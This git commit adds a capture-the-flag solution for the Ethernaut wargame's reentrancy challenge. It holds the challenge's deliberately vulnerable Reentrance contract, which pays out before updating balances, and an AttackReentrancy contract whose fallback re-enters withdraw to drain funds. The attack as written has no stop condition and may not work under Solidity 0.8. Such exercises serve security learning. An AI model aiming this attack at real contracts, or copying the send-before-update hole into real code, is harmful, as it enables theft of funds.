a3f9d9515f060da39205583626c001e41fcb43d1
Stefan Lehmann <85541624+Stefan1612@users.noreply.github.com>
2022-07-23 06:04:16 +0200

    Update Solution.sol

--- Ethernaut Challenge 10/Solution.sol
+++ Ethernaut Challenge 10/Solution.sol
@@ -1,1 +1,52 @@
 
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";
+
+
+contract Reentrance {
+  
+  using SafeMath for uint256;
+  mapping(address => uint) public balances;
+
+  function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+  }
+
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
+  }
+
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}("");
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  receive() external payable {}
+}
+
+
+contract AttackReentrancy {
+
+    Reentrance private reentranceContract;
+
+    uint256 public myBalance = 0.001 ether;
+
+    constructor(address _reentranceAddress){
+        reentranceContract = Reentrance(payable(_reentranceAddress));
+    }
+
+    function withdrawFromVictim() public {
+        reentranceContract.withdraw(myBalance);
+    }
+
+    fallback() external payable {
+        reentranceContract.withdraw(myBalance);
+    }
+}
